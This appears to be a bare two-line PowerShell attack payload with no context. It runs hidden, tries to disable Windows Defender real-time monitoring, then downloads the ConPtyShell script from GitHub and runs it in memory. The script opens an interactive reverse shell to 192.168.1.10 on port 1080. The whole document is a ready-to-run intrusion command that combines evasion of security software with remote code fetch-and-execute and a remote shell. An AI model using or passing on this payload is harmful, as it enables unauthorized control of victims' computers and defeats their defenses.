-w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V;
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.1.10 -RemotePort 1080 -Rows 30 -Cols 90 -CommandLine powershell.exe;
